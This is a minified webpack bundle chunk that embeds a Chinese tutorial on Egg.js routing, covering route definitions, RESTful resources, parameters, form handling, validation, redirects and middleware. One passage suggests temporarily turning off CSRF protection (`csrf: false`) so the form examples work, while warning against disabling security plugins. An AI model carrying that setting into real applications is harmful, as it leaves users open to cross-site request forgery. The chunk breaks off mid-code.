H().useEffect(e,t)},t.useImperativeHandle=function(e,t,n){return H().useImperativeHandle(e,t,n)},t.useLayoutEffect=function(e,t){return H().useLayoutEffect(e,t)},t.useMemo=function(e,t){return H().useMemo(e,t)},t.useReducer=function(e,t,n){return H().useReducer(e,t,n)},t.useRef=function(e){return H().useRef(e)},t.useState=function(e){return H().useState(e)},t.version="16.14.0"},"0Qxj":function(e,t,n){var a=n("0mt+"),r=n("5FRT");a({target:"Array",proto:!0,forced:r!==[].lastIndexOf},{lastIndexOf:r})},"0RY8":function(e,t,n){var a=n("A0UU"),r=n("7Vsj").trim,l=n("4avo"),o=a.parseInt,i=/^[+-]?0[Xx]/,c=8!==o(l+"08")||22!==o(l+"0x16");e.exports=c?function(e,t){var n=r(String(e));return o(n,t>>>0||(i.test(n)?16:10))}:o},"0YMn":function(e,t,n){"use strict";n.d(t,"a",(function(){return i}));var a=n("N/tQ");function r(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}var l=n("b8/4"),o=n("jDmY");function i(e,t){return Object(a["a"])(e)||r(e,t)||Object(l["a"])(e,t)||Object(o["a"])()}},"0bpe":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Router \u4e3b\u8981\u7528\u6765\u63cf\u8ff0\u8bf7\u6c42 URL \u548c\u5177\u4f53\u627f\u62c5\u6267\u884c\u52a8\u4f5c\u7684 Controller \u7684\u5bf9\u5e94\u5173\u7cfb\uff0c \u6846\u67b6\u7ea6\u5b9a\u4e86 ",r.a.createElement("code",null,"app/router.js")," \u6587\u4ef6\u7528\u4e8e\u7edf\u4e00\u6240\u6709\u8def\u7531\u89c4\u5219\u3002"),r.a.createElement("p",null,"\u901a\u8fc7\u7edf\u4e00\u7684\u914d\u7f6e\uff0c\u6211\u4eec\u53ef\u4ee5\u907f\u514d\u8def\u7531\u89c4\u5219\u903b\u8f91\u6563\u843d\u5728\u591a\u4e2a\u5730\u65b9\uff0c\u4ece\u800c\u51fa\u73b0\u672a\u77e5\u7684\u51b2\u7a81\uff0c\u96c6\u4e2d\u5728\u4e00\u8d77\u6211\u4eec\u53ef\u4ee5\u66f4\u65b9\u4fbf\u7684\u6765\u67e5\u770b\u5168\u5c40\u7684\u8def\u7531\u89c4\u5219\u3002"),r.a.createElement("h2",{id:"\u5982\u4f55\u5b9a\u4e49-router"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u5b9a\u4e49-router","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u5b9a\u4e49 Router"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/router.js")," \u91cc\u9762\u5b9a\u4e49 URL \u8def\u7531\u89c4\u5219")),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/user/:id', controller.user.info);\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/controller")," \u76ee\u5f55\u4e0b\u9762\u5b9e\u73b0 Controller")),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async info() {\n    const { ctx } = this;\n    ctx.body = {\n      name: `hello ${ctx.params.id}`,\n    };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u4e00\u4e2a\u6700\u7b80\u5355\u7684 Router \u5b9a\u4e49\uff0c\u5f53\u7528\u6237\u6267\u884c ",r.a.createElement("code",null,"GET /user/123"),"\uff0c",r.a.createElement("code",null,"user.js")," \u8fd9\u4e2a\u91cc\u9762\u7684 info \u65b9\u6cd5\u5c31\u4f1a\u6267\u884c\u3002"),r.a.createElement("h2",{id:"router-\u8be6\u7ec6\u5b9a\u4e49\u8bf4\u660e"},r.a.createElement(l["AnchorLink"],{to:"#router-\u8be6\u7ec6\u5b9a\u4e49\u8bf4\u660e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router \u8be6\u7ec6\u5b9a\u4e49\u8bf4\u660e"),r.a.createElement("p",null,"\u4e0b\u9762\u662f\u8def\u7531\u7684\u5b8c\u6574\u5b9a\u4e49\uff0c\u53c2\u6570\u53ef\u4ee5\u6839\u636e\u573a\u666f\u7684\u4e0d\u540c\uff0c\u81ea\u7531\u9009\u62e9\uff1a"),r.a.createElement(o["a"],{code:"router.verb('path-match', app.controller.action);\nrouter.verb('router-name', 'path-match', app.controller.action);\nrouter.verb('path-match', middleware1, ..., middlewareN, app.controller.action);\nrouter.verb('router-name', 'path-match', middleware1, ..., middlewareN, app.controller.action);",lang:"js"}),r.a.createElement("p",null,"\u8def\u7531\u5b8c\u6574\u5b9a\u4e49\u4e3b\u8981\u5305\u62ec 5 \u4e2a\u4e3b\u8981\u90e8\u5206:"),r.a.createElement("ul",null,r.a.createElement("li",null,"verb - \u7528\u6237\u89e6\u53d1\u52a8\u4f5c\uff0c\u652f\u6301 get\uff0cpost \u7b49\u6240\u6709 HTTP \u65b9\u6cd5\uff0c\u540e\u9762\u4f1a\u901a\u8fc7\u793a\u4f8b\u8be6\u7ec6\u8bf4\u660e\u3002",r.a.createElement("ul",null,r.a.createElement("li",null,"router.head - HEAD"),r.a.createElement("li",null,"router.options - OPTIONS"),r.a.createElement("li",null,"router.get - GET"),r.a.createElement("li",null,"router.put - PUT"),r.a.createElement("li",null,"router.post - POST"),r.a.createElement("li",null,"router.patch - PATCH"),r.a.createElement("li",null,"router.delete - DELETE"),r.a.createElement("li",null,"router.del - \u7531\u4e8e delete \u662f\u4e00\u4e2a\u4fdd\u7559\u5b57\uff0c\u6240\u4ee5\u63d0\u4f9b\u4e86\u4e00\u4e2a delete \u65b9\u6cd5\u7684\u522b\u540d\u3002"),r.a.createElement("li",null,"router.redirect - \u53ef\u4ee5\u5bf9 URL \u8fdb\u884c\u91cd\u5b9a\u5411\u5904\u7406\uff0c\u6bd4\u5982\u6211\u4eec\u6700\u7ecf\u5e38\u4f7f\u7528\u7684\u53ef\u4ee5\u628a\u7528\u6237\u8bbf\u95ee\u7684\u6839\u76ee\u5f55\u8def\u7531\u5230\u67d0\u4e2a\u4e3b\u9875\u3002"))),r.a.createElement("li",null,"router-name \u7ed9\u8def\u7531\u8bbe\u5b9a\u4e00\u4e2a\u522b\u540d\uff0c\u53ef\u4ee5\u901a\u8fc7 Helper \u63d0\u4f9b\u7684\u8f85\u52a9\u51fd\u6570 ",r.a.createElement("code",null,"pathFor")," \u548c ",r.a.createElement("code",null,"urlFor")," \u6765\u751f\u6210 URL\u3002(\u53ef\u9009)"),r.a.createElement("li",null,"path-match - \u8def\u7531 URL \u8def\u5f84\u3002"),r.a.createElement("li",null,"middleware1 - \u5728 Router \u91cc\u9762\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2a Middleware\u3002(\u53ef\u9009)"),r.a.createElement("li",null,"controller - \u6307\u5b9a\u8def\u7531\u6620\u5c04\u5230\u7684\u5177\u4f53\u7684 controller \u4e0a\uff0ccontroller \u53ef\u4ee5\u6709\u4e24\u79cd\u5199\u6cd5\uff1a",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.controller.user.fetch")," - \u76f4\u63a5\u6307\u5b9a\u4e00\u4e2a\u5177\u4f53\u7684 controller"),r.a.createElement("li",null,r.a.createElement("code",null,"'user.fetch'")," - \u53ef\u4ee5\u7b80\u5199\u4e3a\u5b57\u7b26\u4e32\u5f62\u5f0f")))),r.a.createElement("h3",{id:"\u6ce8\u610f\u4e8b\u9879"},r.a.createElement(l["AnchorLink"],{to:"#\u6ce8\u610f\u4e8b\u9879","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6ce8\u610f\u4e8b\u9879"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 Router \u5b9a\u4e49\u4e2d\uff0c \u53ef\u4ee5\u652f\u6301\u591a\u4e2a Middleware \u4e32\u8054\u6267\u884c"),r.a.createElement("li",null,"Controller \u5fc5\u987b\u5b9a\u4e49\u5728 ",r.a.createElement("code",null,"app/controller")," \u76ee\u5f55\u4e2d\u3002"),r.a.createElement("li",null,"\u4e00\u4e2a\u6587\u4ef6\u91cc\u9762\u4e5f\u53ef\u4ee5\u5305\u542b\u591a\u4e2a Controller \u5b9a\u4e49\uff0c\u5728\u5b9a\u4e49\u8def\u7531\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"$","{","fileName","}",".$","{","functionName","}")," \u7684\u65b9\u5f0f\u6307\u5b9a\u5bf9\u5e94\u7684 Controller\u3002"),r.a.createElement("li",null,"Controller \u652f\u6301\u5b50\u76ee\u5f55\uff0c\u5728\u5b9a\u4e49\u8def\u7531\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"$","{","directoryName","}",".$","{","fileName","}",".$","{","functionName","}")," \u7684\u65b9\u5f0f\u6307\u5b9a\u5bf9\u5e94\u7684 Controller\u3002")),r.a.createElement("p",null,"\u4e0b\u9762\u662f\u4e00\u4e9b\u8def\u7531\u5b9a\u4e49\u7684\u65b9\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/home', controller.home);\n  router.get('/user/:id', controller.user.page);\n  router.post('/admin', isAdmin, controller.admin);\n  router.post('/user', isLoginUser, hasAdminPermission, controller.user.create);\n  router.post('/api/v1/comments', controller.v1.comments.create); // app/controller/v1/comments.js\n};",lang:"js"}),r.a.createElement("h3",{id:"restful-\u98ce\u683c\u7684-url-\u5b9a\u4e49"},r.a.createElement(l["AnchorLink"],{to:"#restful-\u98ce\u683c\u7684-url-\u5b9a\u4e49","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"RESTful \u98ce\u683c\u7684 URL \u5b9a\u4e49"),r.a.createElement("p",null,"\u5982\u679c\u60f3\u901a\u8fc7 RESTful \u7684\u65b9\u5f0f\u6765\u5b9a\u4e49\u8def\u7531\uff0c \u6211\u4eec\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"app.router.resources('routerName', 'pathMatch', controller)")," \u5feb\u901f\u5728\u4e00\u4e2a\u8def\u5f84\u4e0a\u751f\u6210 ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/Create,_read,_update_and_delete"},"CRUD")," \u8def\u7531\u7ed3\u6784\u3002"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.resources('posts', '/api/posts', controller.posts);\n  router.resources('users', '/api/v1/users', controller.v1.users); // app/controller/v1/users.js\n};",lang:"js"}),r.a.createElement("p",null,"\u4e0a\u9762\u4ee3\u7801\u5c31\u5728 ",r.a.createElement("code",null,"/posts")," \u8def\u5f84\u4e0a\u90e8\u7f72\u4e86\u4e00\u7ec4 CRUD \u8def\u5f84\u7ed3\u6784\uff0c\u5bf9\u5e94\u7684 Controller \u4e3a ",r.a.createElement("code",null,"app/controller/posts.js")," \u63a5\u4e0b\u6765\uff0c \u4f60\u53ea\u9700\u8981\u5728 ",r.a.createElement("code",null,"posts.js")," \u91cc\u9762\u5b9e\u73b0\u5bf9\u5e94\u7684\u51fd\u6570\u5c31\u53ef\u4ee5\u4e86\u3002"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"Method"),r.a.createElement("th",null,"Path"),r.a.createElement("th",null,"Route Name"),r.a.createElement("th",null,"Controller.Action"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"GET"),r.a.createElement("td",null,"/posts"),r.a.createElement("td",null,"posts"),r.a.createElement("td",null,"app.controllers.posts.index")),r.a.createElement("tr",null,r.a.createElement("td",null,"GET"),r.a.createElement("td",null,"/posts/new"),r.a.createElement("td",null,"new_post"),r.a.createElement("td",null,"app.controllers.posts.new")),r.a.createElement("tr",null,r.a.createElement("td",null,"GET"),r.a.createElement("td",null,"/posts/:id"),r.a.createElement("td",null,"post"),r.a.createElement("td",null,"app.controllers.posts.show")),r.a.createElement("tr",null,r.a.createElement("td",null,"GET"),r.a.createElement("td",null,"/posts/:id/edit"),r.a.createElement("td",null,"edit_post"),r.a.createElement("td",null,"app.controllers.posts.edit")),r.a.createElement("tr",null,r.a.createElement("td",null,"POST"),r.a.createElement("td",null,"/posts"),r.a.createElement("td",null,"posts"),r.a.createElement("td",null,"app.controllers.posts.create")),r.a.createElement("tr",null,r.a.createElement("td",null,"PUT"),r.a.createElement("td",null,"/posts/:id"),r.a.createElement("td",null,"post"),r.a.createElement("td",null,"app.controllers.posts.update")),r.a.createElement("tr",null,r.a.createElement("td",null,"DELETE"),r.a.createElement("td",null,"/posts/:id"),r.a.createElement("td",null,"post"),r.a.createElement("td",null,"app.controllers.posts.destroy")))),r.a.createElement(o["a"],{code:"// app/controller/posts.js\nexports.index = async () => {};\n\nexports.new = async () => {};\n\nexports.create = async () => {};\n\nexports.show = async () => {};\n\nexports.edit = async () => {};\n\nexports.update = async () => {};\n\nexports.destroy = async () => {};",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u4e0d\u9700\u8981\u5176\u4e2d\u7684\u67d0\u51e0\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4e0d\u7528\u5728 ",r.a.createElement("code",null,"posts.js")," \u91cc\u9762\u5b9e\u73b0\uff0c\u8fd9\u6837\u5bf9\u5e94 URL \u8def\u5f84\u4e5f\u4e0d\u4f1a\u6ce8\u518c\u5230 Router\u3002"),r.a.createElement("h2",{id:"router-\u5b9e\u6218"},r.a.createElement(l["AnchorLink"],{to:"#router-\u5b9e\u6218","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"router \u5b9e\u6218"),r.a.createElement("p",null,"\u4e0b\u9762\u901a\u8fc7\u66f4\u591a\u5b9e\u9645\u7684\u4f8b\u5b50\uff0c\u6765\u8bf4\u660e router \u7684\u7528\u6cd5\u3002"),r.a.createElement("h3",{id:"\u53c2\u6570\u83b7\u53d6"},r.a.createElement(l["AnchorLink"],{to:"#\u53c2\u6570\u83b7\u53d6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53c2\u6570\u83b7\u53d6"),r.a.createElement("h4",{id:"query-string-\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#query-string-\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Query String \u65b9\u5f0f"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('/search', app.controller.search.index);\n};\n\n// app/controller/search.js\nexports.index = async (ctx) => {\n  ctx.body = `search: ${ctx.query.name}`;\n};\n\n// curl http://127.0.0.1:7001/search?name=egg",lang:"js"}),r.a.createElement("h4",{id:"\u53c2\u6570\u547d\u540d\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u53c2\u6570\u547d\u540d\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53c2\u6570\u547d\u540d\u65b9\u5f0f"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('/user/:id/:name', app.controller.user.info);\n};\n\n// app/controller/user.js\nexports.info = async (ctx) => {\n  ctx.body = `user: ${ctx.params.id}, ${ctx.params.name}`;\n};\n\n// curl http://127.0.0.1:7001/user/123/xiaoming",lang:"js"}),r.a.createElement("h4",{id:"\u590d\u6742\u53c2\u6570\u7684\u83b7\u53d6"},r.a.createElement(l["AnchorLink"],{to:"#\u590d\u6742\u53c2\u6570\u7684\u83b7\u53d6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u590d\u6742\u53c2\u6570\u7684\u83b7\u53d6"),r.a.createElement("p",null,"\u8def\u7531\u91cc\u9762\u4e5f\u652f\u6301\u5b9a\u4e49\u6b63\u5219\uff0c\u53ef\u4ee5\u66f4\u52a0\u7075\u6d3b\u7684\u83b7\u53d6\u53c2\u6570\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get(\n    /^\\/package\\/([\\w-.]+\\/[\\w-.]+)$/,\n    app.controller.package.detail,\n  );\n};\n\n// app/controller/package.js\nexports.detail = async (ctx) => {\n  // \u5982\u679c\u8bf7\u6c42 URL \u88ab\u6b63\u5219\u5339\u914d\uff0c \u53ef\u4ee5\u6309\u7167\u6355\u83b7\u5206\u7ec4\u7684\u987a\u5e8f\uff0c\u4ece ctx.params \u4e2d\u83b7\u53d6\u3002\n  // \u6309\u7167\u4e0b\u9762\u7684\u7528\u6237\u8bf7\u6c42\uff0c`ctx.params[0]` \u7684 \u5185\u5bb9\u5c31\u662f `egg/1.0.0`\n  ctx.body = `package:${ctx.params[0]}`;\n};\n\n// curl http://127.0.0.1:7001/package/egg/1.0.0",lang:"js"}),r.a.createElement("h3",{id:"\u8868\u5355\u5185\u5bb9\u7684\u83b7\u53d6"},r.a.createElement(l["AnchorLink"],{to:"#\u8868\u5355\u5185\u5bb9\u7684\u83b7\u53d6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8868\u5355\u5185\u5bb9\u7684\u83b7\u53d6"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.post('/form', app.controller.form.post);\n};\n\n// app/controller/form.js\nexports.post = async (ctx) => {\n  ctx.body = `body: ${JSON.stringify(ctx.request.body)}`;\n};\n\n// \u6a21\u62df\u53d1\u8d77 post \u8bf7\u6c42\u3002\n// curl -X POST http://127.0.0.1:7001/form --data '{\"name\":\"controller\"}' --header 'Content-Type:application/json'",lang:"js"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u9644\uff1a")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u8fd9\u91cc\u76f4\u63a5\u53d1\u8d77 POST \u8bf7\u6c42\u4f1a",r.a.createElement("strong",null,"\u62a5\u9519"),"\uff1a'secret is missing'\u3002\u9519\u8bef\u4fe1\u606f\u6765\u81ea ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/csrf/blob/2.5.0/index.js#L69"},"koa-csrf/index.js#L69")," \u3002")),r.a.createElement("blockquote",null,r.a.createElement("p",null,r.a.createElement("strong",null,"\u539f\u56e0"),"\uff1a\u6846\u67b6\u5185\u90e8\u9488\u5bf9\u8868\u5355 POST \u8bf7\u6c42\u5747\u4f1a\u9a8c\u8bc1 CSRF \u7684\u503c\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u8bf7\u5e26\u4e0a CSRF key \u8fdb\u884c\u63d0\u4ea4\uff0c\u53ef\u53c2\u8003",r.a.createElement(l["Link"],{to:"https://eggjs.org/zh-cn/core/security.html#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81csrf%E7%9A%84%E9%98%B2%E8%8C%83"},"\u5b89\u5168\u5a01\u80c1 csrf \u7684\u9632\u8303"))),r.a.createElement("blockquote",null,r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f"),"\uff1a\u4e0a\u9762\u7684\u6821\u9a8c\u662f\u56e0\u4e3a\u6846\u67b6\u4e2d\u5185\u7f6e\u4e86\u5b89\u5168\u63d2\u4ef6 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security"),"\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e9b\u9ed8\u8ba4\u7684\u5b89\u5168\u5b9e\u8df5\uff0c\u5e76\u4e14\u6846\u67b6\u7684\u5b89\u5168\u63d2\u4ef6\u662f\u9ed8\u8ba4\u5f00\u542f\u7684\uff0c\u5982\u679c\u9700\u8981\u5173\u95ed\u5176\u4e2d\u4e00\u4e9b\u5b89\u5168\u9632\u8303\uff0c\u76f4\u63a5\u8bbe\u7f6e\u8be5\u9879\u7684 enable \u5c5e\u6027\u4e3a false \u5373\u53ef\u3002")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u300c\u9664\u975e\u6e05\u695a\u7684\u786e\u8ba4\u540e\u679c\uff0c\u5426\u5219\u4e0d\u5efa\u8bae\u64c5\u81ea\u5173\u95ed\u5b89\u5168\u63d2\u4ef6\u63d0\u4f9b\u7684\u529f\u80fd\u3002\u300d")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u8fd9\u91cc\u5728\u5199\u4f8b\u5b50\u7684\u8bdd\u53ef\u4e34\u65f6\u5728 ",r.a.createElement("code",null,"config/config.default.js")," \u4e2d\u8bbe\u7f6e")),r.a.createElement(o["a"],{code:"exports.security = {\n  csrf: false\n};",lang:"unknown"}),r.a.createElement("h3",{id:"\u8868\u5355\u6821\u9a8c"},r.a.createElement(l["AnchorLink"],{to:"#\u8868\u5355\u6821\u9a8c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8868\u5355\u6821\u9a8c"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.post('/user', app.controller.user);\n};\n\n// app/controller/user.js\nconst createRule = {\n  username: {\n    type: 'email',\n  },\n  password: {\n    type: 'password',\n    compare: 're-password',\n  },\n};\n\nexports.create = async (ctx) => {\n  // \u5982\u679c\u6821\u9a8c\u62a5\u9519\uff0c\u4f1a\u629b\u51fa\u5f02\u5e38\n  ctx.validate(createRule);\n  ctx.body = ctx.request.body;\n};\n\n// curl -X POST http://127.0.0.1:7001/user --data 'username=abc@abc.com&password=111111&re-password=111111'",lang:"js"}),r.a.createElement("h3",{id:"\u91cd\u5b9a\u5411"},r.a.createElement(l["AnchorLink"],{to:"#\u91cd\u5b9a\u5411","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u91cd\u5b9a\u5411"),r.a.createElement("h4",{id:"\u5185\u90e8\u91cd\u5b9a\u5411"},r.a.createElement(l["AnchorLink"],{to:"#\u5185\u90e8\u91cd\u5b9a\u5411","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5185\u90e8\u91cd\u5b9a\u5411"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('index', '/home/index', app.controller.home.index);\n  app.router.redirect('/', '/home/index', 302);\n};\n\n// app/controller/home.js\nexports.index = async (ctx) => {\n  ctx.body = 'hello controller';\n};\n\n// curl -L http://localhost:7001",lang:"js"}),r.a.createElement("h4",{id:"\u5916\u90e8\u91cd\u5b9a\u5411"},r.a.createElement(l["AnchorLink"],{to:"#\u5916\u90e8\u91cd\u5b9a\u5411","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5916\u90e8\u91cd\u5b9a\u5411"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('/search', app.controller.search.index);\n};\n\n// app/controller/search.js\nexports.index = async (ctx) => {\n  const type = ctx.query.type;\n  const q = ctx.query.q || 'nodejs';\n\n  if (type === 'bing') {\n    ctx.redirect(`http://cn.bing.com/search?q=${q}`);\n  } else {\n    ctx.redirect(`https://www.google.co.kr/search?q=${q}`);\n  }\n};\n\n// curl http://localhost:7001/search?type=bing&q=node.js\n// curl http://localhost:7001/search?q=node.js",lang:"js"}),r.a.createElement("h3",{id:"\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528"},r.a.createElement(l["AnchorLink"],{to:"#\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u60f3\u628a\u7528\u6237\u67d0\u4e00\u7c7b\u8bf7\u6c42\u7684\u53c2\u6570\u90fd\u5927\u5199\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e2d\u95f4\u4ef6\u6765\u5b9e\u73b0\u3002 \u8fd9\u91cc\u6211\u4eec\u53ea\u662f\u7b80\u5355\u8bf4\u660e\u4e0b\u5982\u4f55\u4f7f\u7528\u4e2d\u95f4\u4ef6\uff0c\u66f4\u591a\u8bf7\u67e5\u770b ",r.a.createElement(l["Link"],{to:"./middleware"},"\u4e2d\u95f4\u4ef6"),"\u3002"),r.a.createElement(o["a"],{code:"// app/controller/search.js\nexports.index = async (ctx) => {\n  ctx.body = `search: ${ctx.query.name}`;\n};\n\n// app/middleware/uppercase.js\nmodule.exports = () => {\n  return async function uppercase(ctx, next) {\n    ctx.query.name = ctx.query.name && ctx.query.name.toUpperCase();\n    await next();\n  };\n};\n\n// app/router.js\nmodule.exports = (app) => {\n  app.router.get(\n    's',\n    '/search',\n    app.middleware.uppercase(),\n    app.controller.search,\n  );\n};\n\n// curl http://localhost:7001/search?name=egg",lang:"js"}),r.a.createElement("h3",{id:"\u592a\u591a\u8def\u7531\u6620\u5c04"},r.a.createElement(l["AnchorLink"],{to:"#\u592a\u591a\u8def\u7531\u6620\u5c04","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u592a\u591a\u8def\u7531\u6620\u5c04\uff1f"),r.a.createElement("p",null,"\u5982\u4e0a\u6240\u8ff0\uff0c\u6211\u4eec\u5e76\u4e0d\u5efa\u8bae\u628a\u8def\u7531\u89c4\u5219\u903b\u8f91\u6563\u843d\u5728\u591a\u4e2a\u5730\u65b9\uff0c\u4f1a\u7ed9\u6392\u67e5\u95ee\u9898\u5e26\u6765\u56f0\u6270\u3002"),r.a.createElement("p",null,"\u82e5\u786e\u5b9e\u6709\u9700\u6c42\uff0c\u53ef\u4ee5\u5982\u4e0b\u62c6\u5206\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  require('./router/news')(app);\n  require('./router/admin')(app);\n};\n\n// app/router/news.js\nmodule.exports = (app) => {\n  app.router.get('/news/list', app.controller.news.list);\n  app.router.get('/news/detail', app.controller.news.detail);\n};\n\n// app/router/admin.js\nmodule.exports = (app) => {\n  app.router.get('/admin/user', app.controller.admin.user);\n  app.router.get('/admin/log', app.controller.admin.log);\n};",lang:"js"}),r.a.createElement("p",null,"\u4e5f\u53ef\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-router-plus"},"egg-router-plus"),"\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},"0kLB":function(e,t,n){"use strict";var a=n("2EJr"),r=n("FU0I"),l=n("ciTX"),o=(n("ZbH0"),n("3Qq0")),i=n("abDE"),c=n("PE0O"),s=n("dzO+"),u=new Map;function d(e){e.forEach((function(e){var t,n=e.target;null===(t=u.get(n))||void 0===t||t.forEach((function(e){return e(n)}))}))}var m=new s["a"](d);function p(e,t){u.has(e)||(u.set(e,new Set),m.observe(e)),u.get(e).add(t)}function h(e,t){u.has(e)&&(u.get(e)["delete"](t),u.get(e).size||(m.unobserve(e),u["delete"](e)))}var g=n("E3E7"),f=n("+g4N"),E=n("zraO"),b=n("+ujd"),v=function(e){Object(E["a"])(n,e);var t=Object(b["a"])(n);function n(){return Object(g["a"])(this,n),t.apply(this,arguments)}return Object(f["a"])(n,[{key:"render",value:function(){return this.props.children}}]),n}(r["Component"]),y=r["createContext"](null);function k(e){var t=e.children,n=e.onBatchResize,a=r["useRef"](0),l=r["useRef"]([]),o=r["useContext"](y),i=r["useCallback"]((function(e,t,r){a.current+=1;var i=a.current;l.current.push({size:e,element:t,data:r}),Promise.resolve().then((function(){i===a.current&&(null===n||void 0===n||n(l.current),l.current=[])})),null===o||void 0===o||o(e,t,r)}),[n,o]);return r["createElement"](y.Provider,{value:i},t)}function w(e,t){var n=e.children,a=e.disabled,l=r["useRef"](null),s=r["useRef"](null),u=r["useContext"](y),d="function"===typeof n,m=d?n(l):n,g=r["useRef"]({width:-1,height:-1,offsetWidth:-1,offsetHeight:-1}),f=!d&&r["isValidElement"](m)&&Object(i["c"])(m),E=f?m.ref:null,b=r["useMemo"]((function(){return Object(i["a"])(E,l)}),[E,l]),k=function(){return Object(c["a"])(l.current)||Object(c["a"])(s.current)};r["useImperativeHandle"](t,(function(){return k()}));var w=r["useRef"](e);w.current=e;var x=r["useCallback"]((function(e){var t=w.current,n=t.onResize,a=t.data,r=e.getBoundingClientRect(),l=r.width,i=r.height,c=e.offsetWidth,s=e.offsetHeight,d=Math.floor(l),m=Math.floor(i);if(g.current.width!==d||g.current.height!==m||g.current.offsetWidth!==c||g.current.offsetHeight!==s){var p={width:d,height:m,offsetWidth:c,offsetHeight:s};g.current=p;var 